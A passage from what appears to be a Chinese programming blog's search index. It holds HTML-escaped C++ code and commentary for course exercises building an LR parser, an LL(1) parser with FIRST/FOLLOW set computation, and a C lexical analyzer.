(nt.count(non_terminal = next_str(rule.rhs, rule.point_pos)) \u0026amp;\u0026amp; !(non_terminal == rule.lhs \u0026amp;\u0026amp; rule.point_pos == 0)) { tmp.clear(); for (const auto \u0026amp;sspair: rules) { if (sspair.first == non_terminal) {// put in B -\u0026gt; y1, B -\u0026gt; y2, ... tmp.emplace_back(sspair.first, sspair.second); } } tmp = closure(tmp); ret.insert(ret.end(), tmp.begin(), tmp.end()); } } return ret; } 这里就需要用到特地为 LR 分析写的 Rule 对象：\nclass Rule { public: string::size_type point_pos; // position of the point string lhs, rhs; Rule() {} Rule(string _lhs, string _rhs, string::size_type _point_pos=0):lhs(_lhs), rhs(_rhs), point_pos(_point_pos) {} bool operator == (const Rule \u0026amp;r) const { return (lhs == r.lhs \u0026amp;\u0026amp; rhs == r.rhs \u0026amp;\u0026amp; point_pos == r.point_pos); } }; typedef vector\u0026lt;Rule\u0026gt; State; // I_0, I_1, ... vector\u0026lt;State\u0026gt; graph; // DFA graph 闭包函数的测试比较麻烦，最好多测几个状态，这样才能发现潜在的问题。注意：闭包函数如果存在问题，很有可能导致后面分析表正确的情况下依然得到错误的结果或陷入死循环。\n构造 DFA 与分析表 # 这一步需要一边构造 DFA，一边填 action 和 goto 表。手动画下图，可以发现这里构造 DFA 的算法无非是一个 BFS。\n但是和 BFS 不同，这里不需要用队列实现，因为需要存好已经计算出的状态（而不是舍弃），在后面状态的计算中与之比对，防止重复状态带来的冗余。所以数组存下来就好。\n从起始符开始逐状态计算，对于已计算的状态（往往只有 1-2 个规则），只有求过一次闭包后才能说这个状态是完整的（可能拓展到近 10 条规则）。但有趣的是，只要判断两个状态的第一条规则是否完全相同（包括点的位置），就可以判断两个状态是否是重复的（为什么？）。这样就舒服了很多。\n剩余的内容就是套路了。在下面的代码中用到了 goto 这个饱受诟病的关键字（不是 goto 表！），然而在跳出多层循环时，必须承认使用 goto 绝对是利大于弊的。\n/* Construct the DFA graph of States */ void build_graph() { State I0; I0.emplace_back(start_symbol +\u0026#34;\u0026#39;\u0026#34;, start_symbol); graph.push_back(I0); string pointed; // the symbol being pointed at State new_state; for (int cur = 0; cur != graph.size(); ++cur) { // every State in graph graph[cur] = closure(graph[cur]); // now we can say graph[cur] is complete for (int i = 0; i \u0026lt; graph[cur].size(); ++i) {// every Rule in graph[cur] Rule \u0026amp;rule = graph[cur][i]; pointed = next_str(rule.rhs, rule.point_pos); if (pointed ==\u0026#34;E\u0026#34;) { // . is at the tail, reduce if (rule.lhs == start_symbol +\u0026#34;\u0026#39;\u0026#34;) { action[cur][t[\u0026#34;$\u0026#34;]] = acc; } else { for (const string \u0026amp;expr: FOLLOW[rule.lhs]) { // SLR: consider every terminal in FOLLOW action[cur][t[expr]] = -1 * distance(rules.begin(), find(rules.begin(), rules.end(), make_pair(rule.lhs, rule.rhs))); } } continue; } int \u0026amp;target = nt.count(pointed) ? go_to[cur][nt[pointed]] : action[cur][t[pointed]]; // the target blank we\u0026#39;re filling if (target == 0) { // the blank is not already filled target = graph.size(); for (int j = 1; j \u0026lt; graph.size(); ++j) { if (graph[j][0] == Rule(rule.lhs, rule.rhs, rule.point_pos + pointed.size() + 1)) { target = j; // replace the target by the real State goto dup; } } graph.emplace_back(new_state); // create the new empty state } graph[target].emplace_back(rule.lhs, rule.rhs, rule.point_pos + pointed.size() + 1); dup: ; } } } 进行语法分析 # 这次的输出，和 LL 语法分析不同，对循环结构更友好。果断用 stack 实现。\n需要注意的就是行数统计不要重复统计，我这里放在了 shift 情况里。至于 reduce 中要注意的就是 E 这个代表 ε 的字符，在考虑规则右边的符号个数时，它是不能被算作一个符号的，这一度让我对着死循环迷惑了很久。\n其余的依旧是套路，最后在遇到为 0 的表项时说明发生了语法错误，这里错误处理偷了个懒。\nvoid parse() { stack\u0026lt;string\u0026gt; s; s.push(\u0026#34;0\u0026#34;); int num, len, tmp; string input_top; string::size_type start; out.clear(); while (!(s.top() == \u0026#34;1\u0026#34; \u0026amp;\u0026amp; input == \u0026#34;$\u0026#34;)) { input_top = next_str(input, 0); if ((num = action[stoi(s.top())][t[input_top]]) \u0026gt; 0) { // shift start = input.find_first_not_of(\u0026#34; \\n\\t\u0026#34;, input_top.size()); if (input.substr(0, start).find(\u0026#39;\\n\u0026#39;) != string::npos) { // when we\u0026#39;re bypassing a \\n ++line; } s.push(input_top); s.push(to_string(num)); input = input.substr(start); // get rid of input_top } else if (num \u0026lt; 0) { // reduce num = -num; out.push_back(num); len = count(rules[num].second.begin(), rules[num].second.end(),\u0026#39; \u0026#39;) + 1; // num of symbols if (rules[num].second == \u0026#34;E\u0026#34;) { // but!!! E is special len = 0; } for (int i = 0; i \u0026lt; (len\u0026lt;\u0026lt;1); ++i) { s.pop(); } tmp = go_to[stoi(s.top())][nt[rules[num].first]]; s.push(rules[num].first); s.push(to_string(tmp)); } else { // mistake cout \u0026lt;\u0026lt;\u0026#34; 语法错误，第 \u0026#34;\u0026lt;\u0026lt; line-1 \u0026lt;\u0026lt;\u0026#34; 行，缺少 \\\u0026#34;;\\\u0026#34;\u0026#34; \u0026lt;\u0026lt; endl; input = \u0026#34;;\u0026#34; + input; } } } 输出 # 相对简单，但也有坑。首先 E 依然要特判，输出时不能输出，而且还要 “倒扣” 一个字符。\n然后是这里在替换（也就是归约）子串时，用了 rfind 方法定位而不是 find，因为是最右推导嘛。\nvoid output() { string output = start_symbol; pair\u0026lt;string, string\u0026gt; rule; cout \u0026lt;\u0026lt;output \u0026lt;\u0026lt;\u0026#34; =\u0026gt; \u0026#34;; for (string::size_type i = out.size()-1; i \u0026gt; 0; --i) { rule = rules[out[i]]; string new_str = (rule.second ==\u0026#34;E\u0026#34;?\u0026#34;\u0026#34;: rule.second); // deal with E and ws output.replace(output.rfind(rule.first), rule.first.size() + (rule.second ==\u0026#34;E\u0026#34;), new_str); cout \u0026lt;\u0026lt;endl \u0026lt;\u0026lt; output \u0026lt;\u0026lt;\u0026#34; =\u0026gt; \u0026#34;; } rule = rules[out[0]]; cout \u0026lt;\u0026lt;endl \u0026lt;\u0026lt; output.replace(output.rfind(rule.first), rule.first.size(), rule.second) \u0026lt;\u0026lt;\u0026#34; \u0026#34;; } 坑点 # 都是能让人迷惑一段时间的坑，这就是 LR 语法分析更难的地方吧：\n左递归文法 FIRST 集的懒计算处理 闭包函数左右非终结符相同的情况处理 状态去重 E 不能算作一个符号 输出时 E 的特判 替换最右端的那个子串 ","date":"2019-05-15","permalink":"/posts/lr-parser/","section":"Posts","summary":"\u003cp\u003e天 坑 预 警\u003c/p\u003e","title":"LR 语法分析器"},{"content":"","date":"2019-05-15","permalink":"/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/","section":"Tags","summary":"","title":"编译原理"},{"content":"这次繁杂了许多，我有点害怕接下来的 LR(1) 语法分析器了。\n概述 # 这次需要用 LL(1) 方法也就是自顶向下方法实现语法分析器，并且需要识别并改正简单的语法错误（这里只出现了漏分号的错误）。举个栗子，输入：\n{ while (ID == NUM) { ID = NUM } } 需要按这个格式输出：\n语法错误, 第 4 行, 缺少 \u0026#34;;\u0026#34; program compoundstmt { stmts stmt whilestmt while ( boolexpr arithexpr multexpr simpleexpr ID multexprprime E arithexprprime E boolop == arithexpr multexpr simpleexpr NUM multexprprime E arithexprprime E ) stmt compoundstmt { stmts stmt assgstmt ID = arithexpr multexpr simpleexpr NUM multexprprime E arithexprprime E ; stmts E } stmts E } 遵循的规则，也就是 CFG 的产生式是：\nprogram -\u0026gt; compoundstmt stmt -\u0026gt; ifstmt | whilestmt | assgstmt | compoundstmt compoundstmt -\u0026gt; {stmts} stmts -\u0026gt; stmt stmts | E ifstmt -\u0026gt; if (boolexpr) then stmt else stmt whilestmt -\u0026gt; while (boolexpr) stmt assgstmt -\u0026gt; ID = arithexpr ; boolexpr -\u0026gt; arithexpr boolop arithexpr boolop -\u0026gt; \u0026lt;|\u0026gt; | \u0026lt;= |\u0026gt;= | == arithexpr -\u0026gt; multexpr arithexprprime arithexprprime -\u0026gt; + multexpr arithexprprime | - multexpr arithexprprime | E multexpr -\u0026gt; simpleexpr multexprprime multexprprime -\u0026gt; * simpleexpr multexprprime | / simpleexpr multexprprime | E simpleexpr -\u0026gt; ID | NUM | (arithexpr) 注意到这里面已经消除了左递归，也没有公共左因子（最后发现也没有二义性），非常舒服。\n起始符是 program，保留字有：\n{ } ( ) if then else while ID NUM \u0026gt; \u0026lt;=\u0026gt;= \u0026lt;= == + - * / E 是 \u0026#39;空\u0026#39; 思路与代码 # 其实坑不多，但是容易自己给自己挖坑，例如抄规则把规则抄错等，其实很难发现。\n准备工作 # 首先我们需要将产生式存下来。由于产生式本身是一种映射关系，容易想到用 map 存储。因为懒得处理 |，直接把用 | 分隔的产生式拆开。这样一来，产生式左边的非终结符就可能出现多次，因此最终使用了 multimap。\nconst multimap\u0026lt;string, string\u0026gt; rules = { {\u0026#34;program\u0026#34;, \u0026#34;compoundstmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;ifstmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;whilestmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;assgstmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;compoundstmt\u0026#34;}, {\u0026#34;compoundstmt\u0026#34;, \u0026#34;{ stmts}\u0026#34;}, {\u0026#34;stmts\u0026#34;, \u0026#34;stmt stmts\u0026#34;}, {\u0026#34;stmts\u0026#34;, \u0026#34;E\u0026#34;}, {\u0026#34;ifstmt\u0026#34;, \u0026#34;if ( boolexpr) then stmt else stmt\u0026#34;}, {\u0026#34;whilestmt\u0026#34;, \u0026#34;while ( boolexpr) stmt\u0026#34;}, {\u0026#34;assgstmt\u0026#34;, \u0026#34;ID = arithexpr ;\u0026#34;}, {\u0026#34;boolexpr\u0026#34;, \u0026#34;arithexpr boolop arithexpr\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026lt;\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026gt;\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026lt;=\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026gt;=\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;==\u0026#34;}, {\u0026#34;arithexpr\u0026#34;, \u0026#34;multexpr arithexprprime\u0026#34;}, {\u0026#34;arithexprprime\u0026#34;, \u0026#34;+ multexpr arithexprprime\u0026#34;}, {\u0026#34;arithexprprime\u0026#34;, \u0026#34;- multexpr arithexprprime\u0026#34;}, {\u0026#34;arithexprprime\u0026#34;, \u0026#34;E\u0026#34;}, {\u0026#34;multexpr\u0026#34;, \u0026#34;simpleexpr multexprprime\u0026#34;}, {\u0026#34;multexprprime\u0026#34;, \u0026#34;* simpleexpr multexprprime\u0026#34;}, {\u0026#34;multexprprime\u0026#34;, \u0026#34;/ simpleexpr multexprprime\u0026#34;}, {\u0026#34;multexprprime\u0026#34;, \u0026#34;E\u0026#34;}, {\u0026#34;simpleexpr\u0026#34;, \u0026#34;ID\u0026#34;}, {\u0026#34;simpleexpr\u0026#34;, \u0026#34;NUM\u0026#34;}, {\u0026#34;simpleexpr\u0026#34;, \u0026#34;( arithexpr)\u0026#34;} /*{\u0026#34;e\u0026#34;,\u0026#34;t e\u0026#39;\u0026#34;}, {\u0026#34;e\u0026#39;\u0026#34;,\u0026#34;+ t e\u0026#39;\u0026#34;}, {\u0026#34;e\u0026#39;\u0026#34;,\u0026#34;E\u0026#34;}, {\u0026#34;t\u0026#34;, \u0026#34;f t\u0026#39;\u0026#34;}, {\u0026#34;t\u0026#39;\u0026#34;,\u0026#34;* f t\u0026#39;\u0026#34;}, {\u0026#34;t\u0026#39;\u0026#34;,\u0026#34;E\u0026#34;}, {\u0026#34;f\u0026#34;, \u0026#34;( e)\u0026#34;}, {\u0026#34;f\u0026#34;, \u0026#34;id\u0026#34;}*/ }; 最后被注释掉的部分是一个更简单的 CFG，在后面检验 FIRST 集、FOLLOW 集和分析表时，我们会看到先处理这个简单 CFG 的情况要容易得多。\n接下来是存储终结符与非终结符。原本的想法是采用数组，但是仔细想一想，我们存储所有终结符和非终结符是为了做什么？\n因为这些符号需要作为 LL 分析表的行和列，这意味着对于任意一个符号，我们将需要确定它在对应集合中的位置，以便在分析表中插入条目。而分析表采用什么数据结构最合适？简便起见，我们采用了二维数组，这样方便我们用 table[non_terminal_pos][terminal_pos] 来唯一确定表的条目。也就是说，这个集合需要是有序的，因为分析表是有序的。此外，我们还知道：数组下标必须是数字；终结符和非终结符都是唯一的。\n用 set 和 map 都可以满足有序性（偷懒起见，我当然不想在插入时自己考虑顺序问题，而优先队列并不适合随机访问）和唯一性。然而，二者都会基于终结符和非终结符的字典序排序，要找到一个符号我们必须使用 find 方法。这样也许不会有什么效率问题，但不够优雅。\n但我们其实可以强行规定一个顺序，从而无视原来的排序，像这样：\nmap\u0026lt;string, int\u0026gt; nt = { // non-terminals, the map below is terminals {\u0026#34;program\u0026#34;, 0}, {\u0026#34;stmt\u0026#34;, 1}, {\u0026#34;compoundstmt\u0026#34;, 2}, {\u0026#34;stmts\u0026#34;, 3}, {\u0026#34;ifstmt\u0026#34;, 4}, {\u0026#34;whilestmt\u0026#34;, 5}, {\u0026#34;assgstmt\u0026#34;, 6}, {\u0026#34;boolexpr\u0026#34;, 7}, {\u0026#34;boolop\u0026#34;, 8}, {\u0026#34;arithexpr\u0026#34;, 9}, {\u0026#34;arithexprprime\u0026#34;, 10}, {\u0026#34;multexpr\u0026#34;, 11}, {\u0026#34;multexprprime\u0026#34;, 12}, {\u0026#34;simpleexpr\u0026#34;, 13} /*{\u0026#34;e\u0026#34;, 0}, {\u0026#34;e\u0026#39;\u0026#34;, 1}, {\u0026#34;t\u0026#34;, 2}, {\u0026#34;t\u0026#39;\u0026#34;, 3}, {\u0026#34;f\u0026#34;, 4}*/ }; map\u0026lt;string, int\u0026gt; t = { {\u0026#34;{\u0026#34;, 0}, {\u0026#34;}\u0026#34;, 1}, {\u0026#34;(\u0026#34;, 2}, {\u0026#34;)\u0026#34;, 3}, {\u0026#34;if\u0026#34;, 4}, {\u0026#34;then\u0026#34;, 5}, {\u0026#34;else\u0026#34;, 6}, {\u0026#34;while\u0026#34;, 7}, {\u0026#34;ID\u0026#34;, 8}, {\u0026#34;=\u0026#34;, 9}, {\u0026#34;\u0026gt;\u0026#34;, 10}, {\u0026#34;\u0026lt;\u0026#34;, 11}, {\u0026#34;\u0026gt;=\u0026#34;, 12}, {\u0026#34;\u0026lt;=\u0026#34;, 13}, {\u0026#34;==\u0026#34;, 14}, {\u0026#34;+\u0026#34;, 15}, {\u0026#34;-\u0026#34;, 16}, {\u0026#34;*\u0026#34;, 17}, {\u0026#34;/\u0026#34;, 18}, {\u0026#34;NUM\u0026#34;, 19}, {\u0026#34;E\u0026#34;, 20}, {\u0026#34;;\u0026#34;, 21}, {\u0026#34;$\u0026#34;, 22} /*{\u0026#34;+\u0026#34;, 0}, {\u0026#34;*\u0026#34;, 1}, {\u0026#34;(\u0026#34;, 2}, {\u0026#34;)\u0026#34;, 3}, {\u0026#34;id\u0026#34;, 4}, {\u0026#34;E\u0026#34;, 5}, {\u0026#34;$\u0026#34;, 6}*/ }; 好吧，这样也算不上优雅。\n最后是存储分析表，如上文所述，我采用了二维 string 数组的方式，数组内只存储产生式右边的字符串，因为产生式左边必定是该行对应的非终结符。\n计算 FIRST 集和 FOLLOW 集 # 首先要考虑的问题依然是，用什么数据结构存储这两个集合？\n以 FIRST 集为例，我们知道一个符号的 FIRST 集是由多个终结符组成的集合。同一集合中，这些终结符不会重复，而且我们并不关心它们的顺序。各种操作的复杂度为 O(1) 的 unordered_set 无疑是最佳选择了。随后再利用 map 建立符号与其 FIRST 之间的联系。\ntypedef unordered_set\u0026lt;string\u0026gt; str_set; map\u0026lt;string, str_set\u0026gt; FIRST, FOLLOW; FIRST 集和 FOLLOW 集的具体计算方法这里不再赘述。但值得一提的是，它们的共通之处是都通过循环来更新集合本身，直到集合不再发生变化。而在这里的代码中，我不知道为什么写了个递归版本。\nFIRST 集：\n/* Whether there\u0026#39;s a rule lhs -\u0026gt; rhs */ bool exist_rule(const string \u0026amp;lhs, const string \u0026amp;rhs) { for (auto iter = rules.lower_bound(lhs); iter != rules.upper_bound(lhs); ++iter) { if (iter-\u0026gt;second == rhs) { return true; } } return false; } /* Compute FIRST[expr] recursively */ str_set compute_first(const string \u0026amp;expr) { if (!FIRST[expr].empty()) { // Already calculated return FIRST[expr]; } if (exist_rule(expr,\u0026#34;E\u0026#34;)) { FIRST[expr].insert(\u0026#34;E\u0026#34;); } string y_n; // X -\u0026gt; y_1 y_2 ... y_n ... stringstream ss; str_set tmp; for (auto iter = rules.lower_bound(expr); iter != rules.upper_bound(expr); ++iter) { ss.clear(); ss.str(iter-\u0026gt;second); while (ss\u0026gt;\u0026gt; y_n) { tmp = compute_first(y_n); if (!tmp.count(\u0026#34;E\u0026#34;)) { FIRST[expr].insert(tmp.begin(), tmp.end()); // the same as set_union() in std::set break; } } } return FIRST[expr]; } lowerbound 和 upperbound 真的好用。另外要注意的是 unordered_set 不能用 set_union 方法，只能从头到尾全部 insert。主函数中计算代码：\n// Init FIRST str_set tmp; for (const auto \u0026amp;expr: t) { tmp.clear(); tmp.insert(expr.first); FIRST.insert(make_pair(expr.first, tmp)); } for (const auto \u0026amp;expr: nt) { compute_first(expr.first); } FOLLOW 集：\n/* Starting from start_pos, return the next consecutive substr without ws */ string next_str(string str, string::size_type start_pos) { if (start_pos\u0026gt; str.size()) { return \u0026#34;E\u0026#34;; // for FIRST[\u0026#34;E\u0026#34;] = {\u0026#34;E\u0026#34;} } string::size_type end_pos = str.find_first_of(\u0026#34; \\n\\t\u0026#34;, start_pos); if (end_pos == string::npos) { end_pos = str.size(); } return str.substr(start_pos, end_pos - start_pos); } /* Compute FOLLOW[expr] recursively */ str_set compute_follow(const string \u0026amp;expr) { if (follow_visited.count(expr)) { return FOLLOW[expr]; } follow_visited.insert(expr); // mark as visited string::size_type pos, end; str_set tmp, first_beta; for (const auto \u0026amp;sspair: rules) { for (pos = 0; (pos = sspair.second.find(expr, pos)) != string::npos; pos = end) { // expr found in rhs end = pos + expr.size(); if ((end == sspair.second.size() || sspair.second[end] == \u0026#39;\u0026#39;) \u0026amp;\u0026amp; (pos == 0 || sspair.second[pos-1] == \u0026#39;\u0026#39;)) { // for u-know-y if (end == sspair.second.size()) { // At tail tmp = compute_follow(sspair.first); FOLLOW[expr].insert(tmp.begin(), tmp.end()); } else { // Not at tail, but E is in FIRST[string that follows] first_beta = FIRST[next_str(sspair.second, end+1)]; if (first_beta.count(\u0026#34;E\u0026#34;)) { tmp = compute_follow(sspair.first); FOLLOW[expr].insert(tmp.begin(), tmp.end()); } // Everything in FIRST[beta] is in FOLLOW[expr] except E(see outside the loop) FOLLOW[expr].insert(first_beta.begin(), first_beta.end()); } } } } FOLLOW[expr].erase(\u0026#34;E\u0026#34;); return FOLLOW[expr]; } FOLLOW 集的递归边界不能像 FIRST 集一样简单粗暴，所以我设置了：\nstr_set follow_visited; // if FOLLOW[str] has been computed 来记录该符号的 FOLLOW 集是否已经被计算过。这是因为存在这样一组略有些棘手的 “右递归” 的文法：\nstmt -\u0026gt; ifstmt | whilestmt | assgstmt | compoundstmt ifstmt -\u0026gt; if (boolexpr) then stmt else stmt 于是，相应的主函数计算代码也要改：\nprog += \u0026#34;$\u0026#34;; // Init FOLLOW tmp.clear(); tmp.insert(\u0026#34;$\u0026#34;); FOLLOW.insert(make_pair(\u0026#34;program\u0026#34;, tmp)); for (int i = 0; i \u0026lt; 2; ++i) { follow_visited.clear(); for (const auto \u0026amp;expr: nt) { compute_follow(expr.first); } } 其中 prog 是读入的程序字符串。\n我们可以测试一下计算是否正确：\n/* Test if FIRST and FOLLOW are correct */ void ff_test() { for (const auto \u0026amp;expr: nt) { cout \u0026lt;\u0026lt; expr.first \u0026lt;\u0026lt;\u0026#34; :: \u0026#34;; for (const string \u0026amp;s: FIRST[expr.first]) { cout \u0026lt;\u0026lt; s \u0026lt;\u0026lt;\u0026#34;, \u0026#34;; } cout \u0026lt;\u0026lt;\u0026#34; :: \u0026#34;; for (const string \u0026amp;s: FOLLOW[expr.first]) { cout \u0026lt;\u0026lt; s \u0026lt;\u0026lt;\u0026#34;, \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } 构造 LL 分析表 # 处理好下标，直接套算法就完成了。这里就凸显出前面 nt 和 t 采用 map\u0026lt;string, int\u0026gt; 存储的优势，使得由一个符号找到它对应于表中的位置十分方便。\n注意：在 nt 中我把 $ 也当作终结符处理，这样在代码中的 step 3 就不用拆成两步了，比较方便。但实际上 $ 既不是终结符也不是非终结符。\n/* Construct the LL parsing table */ void construct_table() { str_set first_alpha, follow_alpha; int A; // for all rules A -\u0026gt; alpha for (const auto \u0026amp;sspair: rules) { first_alpha = FIRST[next_str(sspair.second, 0)]; follow_alpha = FOLLOW[sspair.first]; A = nt[sspair.first]; // step 2(unfortunately index must be number) for (const auto \u0026amp;terminal: t) { if (first_alpha.count(terminal.first) \u0026amp;\u0026amp; terminal.first != \u0026#34;E\u0026#34;) { table[A][t[terminal.first]] = sspair.second; } } if (first_alpha.count(\u0026#34;E\u0026#34;)) { // step 3 for (const string\u0026amp; b: follow_alpha) { table[A][t[b]] = sspair.second; } } } } 测试一下（针对较简单 CFG 情况写的）：\n/* Test if the parsing table is correct */ void table_test() { cout \u0026lt;\u0026lt;\u0026#34;+ * () id E $\u0026#34; \u0026lt;\u0026lt; endl; for (int i = 0; i \u0026lt; 5; ++i) { for (int j = 0; j \u0026lt; 7; ++j) { cout \u0026lt;\u0026lt;table[i][j] \u0026lt;\u0026lt;\u0026#34; | \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } 进行语法分析 # 本来是想用 stack 实现的，但是一看需要的输出，很显然用等价的递归是更方便的。\n随后，注意到语法错误需要在一开始输出，而如果递归处理是会边处理边输出的，因此考虑扫描两次，第一次不输出，但当发现语法错误后输出提示信息并不再扫描；第二次才边处理边输出。所以加了 bool scan 参数，scan == true 表示处于第一次的 “扫描模式”。\n/* This func can both scan the prog to find mistakes and do the parsing */ void parse(const string top, int tab_cnt, bool scan) { if (!scan) { if (top !=\u0026#34;program\u0026#34;) { cout \u0026lt;\u0026lt; endl; for (int i = 0; i \u0026lt; tab_cnt; ++i) { cout \u0026lt;\u0026lt;\u0026#34;\\t\u0026#34;; } } cout \u0026lt;\u0026lt; top; } else { if (flag) return; } string input_top = next_str(input, 0); if (top == input_top) { string::size_type start = input.find_first_not_of(\u0026#34; \\n\\t\u0026#34;, input_top.size()); if (scan \u0026amp;\u0026amp; input.substr(0, start).find(\u0026#39;\\n\u0026#39;) != string::npos) { // in scan mode, when we\u0026#39;re bypassing a \\n ++line; } // get rid of input_top input = input.substr(start); return; } else if (top ==\u0026#34;E\u0026#34;) { // in case of unnecessary trouble return; } else if (scan \u0026amp;\u0026amp; t.count(top)) { // in scan mode, top is a terminal but cannot match input_top, indicating a mistake cout \u0026lt;\u0026lt;\u0026#34; 语法错误, 第 \u0026#34;\u0026lt;\u0026lt; line-1 \u0026lt;\u0026lt;\u0026#34; 行, 缺少 \\\u0026#34;\u0026#34; \u0026lt;\u0026lt; top \u0026lt;\u0026lt;\u0026#34;\\\u0026#34;\u0026#34; \u0026lt;\u0026lt; endl; string::size_type ins = prog.find(input); // find the insertion point prog.insert(ins,\u0026#34; \u0026#34;+ top +\u0026#34; \u0026#34;); // fix the mistake flag = true; // stop scanning return; } string rhs = table[nt[top]][t[input_top]]; string cur; stringstream ss(rhs); while (ss\u0026gt;\u0026gt; cur) { parse(cur, tab_cnt + 1, scan); } } 需要全局变量：\nstring input; int line = 1; bool flag; // if the scanning is over 主函数中，就只需要：\n// Scan, then parse input = prog; parse(\u0026#34;program\u0026#34;, 0, true); input = prog; parse(\u0026#34;program\u0026#34;, 0, false); 坑点 # 如果不从较简单的情况开始，会很容易出错 空白符（\\n \\t）的处理，一定要复制输入而不是手打，不然会像我一样被坑两三个小时 “右递归” 的存在使得 FOLLOW 集计算很容易出错，而看起来像是对的（这里感觉递归的方法不如循环） 行数统计 定位错误在原来程序字符串中的位置，并修复 ","date":"2019-05-09","permalink":"/posts/ll-parser/","section":"Posts","summary":"\u003cp\u003e这次繁杂了许多，我有点害怕接下来的 LR(1) 语法分析器了。\u003c/p\u003e","title":"LL 语法分析器"},{"content":"奇怪的思路果然总是通向奇怪的出路。\n概述 # 编译原理课的实训题，难度是不大的，然而我自作聪明地用 stringstream 强行给自己增加了难度……\n实际上，即使增加了这点难度，这次实训依然不难，然而有两个天坑：\n对于格式化字符串里诸如 %d 的字符，需要将其视为一个词素 注释也被算作词素，需要被打印出来 这两条都是实训题人为规定的。第一条或许还能理解，但是真正实现起来会是代码复杂很多，因此我在代码里暴力绕过了这个限制。\n注：为什么说实现第一条比较复杂？ 这不仅是因为 C 语言中存在 % 运算符，即取模，还因为格式化字符串本身十分灵活。不妨考虑遇到如下六种模式时如何匹配：\nprintf(\u0026quot;%d, i\u0026quot;) 普通情况 printf(\u0026quot;%-5d\u0026quot;, i) 右对齐，或者高位补 0 等操作 printf(\u0026quot;%.2f\u0026quot;, i) 浮点数精度 printf(\u0026quot;%d %d %d\u0026quot;, i, j, k) 多个空格隔开的 %d 使得识别 % 前面的 \u0026quot; 来判断是否在字符串内变得不可行 printf(\u0026quot;50%% %d\u0026quot;, i) 取模符号本身的转义 a = a % d 字符串外的取模符号 解决方法还是有的：记录 \u0026quot; 的开闭状态来判断当前的 % 是否在字符串中，对 %-，%. 和 %% 特判。但是这样就有点复杂了。\n第二条就恶心得多了。众所周知，处理注释的最好方法是在一开始就删掉它（我最初也是这么做的），然而由于第二条规定的存在，我不得不使用一些小技巧来达到要求。这也是这次走远了的主要原因，为此我多花了一个小时。关于这些技巧会在后面详述。\n思路 # 代码的主要思想是用 map 存词素对应编号，借助 stringstream 对象按空白符分隔程序语句逐条处理（然而这并没有多大用，因为 C 语言很多地方是允许不空格的，我最后还是得逐字符分析）。\n对于数字开头的一段字符，可以确定直到非数字字符之前都是同一个数字，算作一个词素。 如果我们运气足够好（编译代码风格较好的 C 代码），stringstream 分出来的语句大多能匹配上 map 里的词素。不过实际情况中我们可以认为这是小概率事件，所以放在了 else 而不是 if 里。 接下来就是针对分离出来的这一小段 cur 作扫描了，本来可以用递归优雅地扫描，然而如果出现很长一段没有空格的语句，递归可能使栈溢出，因此这里采用循环来替代。先从左至右匹配 map 里的词素，直到第一次匹配成功。 匹配成功并没有结束，我们还需要进行贪婪匹配。举个栗子，\u0026lt;\u0026lt;= 可以匹配 \u0026lt;，\u0026lt;\u0026lt; 和 \u0026lt;\u0026lt;= 三个词素，显然我们应匹配最后一个，也就是尽可能长的那个词素。匹配完成后输出，并跳过已匹配的那一段继续。 也有可能我们在第 3 步根本无法匹配成功，这说明该串以标识符开头，例如 main()，因此我们把标识符名拿出来以后再继续。方法是扫描至第一个不是下划线 / 字母 / 数字的字符为止。 本来这样就结束了，我可以高高兴兴地删掉注释、trim 掉两边空格、处理下最后一行不能换行的无聊问题后就搞定的。然而。。。为什么注释要被当作词素打印出来？？这种做法完全是不合理而低效的。\n注释的处理 # 代码长度因为处理毫无处理必要的注释增加了许多。首先在清除注释时（对，我一定要清除注释）先把注释内容按单行 / 多行保存到两个数组里，随后是杂技表演时间：\n对于单行注释，用 @n 替换原注释，因为 @ 这个符号在 C 源代码里没有什么特殊含义，也不能在标识符中出现（$ 是可以的，有点奇怪）。其中 n 表示这是第 n 个单行注释。 对于多行注释同理，用 `n 替换原注释。 于是扫描时，当我们发现一个语句无法匹配词素、且截取标识符也没有变动下标时，只可能是遇到了单字母变量，或者是我们作的这两个标记之一。isalpha 排除掉前者情况，这时拿出刚才数组里存的对应注释内容，打印输出即可。\n这种杂技看似好玩，实际上也是走远了之后的无奈之举，我觉得肯定是存在隐患的，也并不利于维护。因此强烈不推荐用这种方法，直接清除注释的办法高到不知道哪里去了。\nC++ 代码 # 不到 200 行。\n// C 语言词法分析器 #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;sstream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; /* 不要修改这个标准输入函数 */ void read_prog(string\u0026amp; prog) { char c; while(scanf(\u0026#34;%c\u0026#34;,\u0026amp;c)!=EOF){ prog += c; } } /* 你可以添加其他函数 */ map\u0026lt;string, int\u0026gt; tokens = { {\u0026#34;auto\u0026#34;, 1}, {\u0026#34;break\u0026#34;, 2}, {\u0026#34;case\u0026#34;, 3}, {\u0026#34;char\u0026#34;, 4}, {\u0026#34;const\u0026#34;, 5}, {\u0026#34;continue\u0026#34;, 6}, {\u0026#34;default\u0026#34;, 7}, {\u0026#34;do\u0026#34;, 8}, {\u0026#34;double\u0026#34;, 9}, {\u0026#34;else\u0026#34;, 10}, {\u0026#34;enum\u0026#34;, 11}, {\u0026#34;extern\u0026#34;, 12}, {\u0026#34;float\u0026#34;, 13}, {\u0026#34;for\u0026#34;, 14}, {\u0026#34;goto\u0026#34;, 15}, {\u0026#34;if\u0026#34;, 16}, {\u0026#34;int\u0026#34;, 17}, {\u0026#34;long\u0026#34;, 18}, {\u0026#34;register\u0026#34;, 19}, {\u0026#34;return\u0026#34;, 20}, {\u0026#34;short\u0026#34;, 21}, {\u0026#34;signed\u0026#34;, 22}, {\u0026#34;sizeof\u0026#34;, 23}, 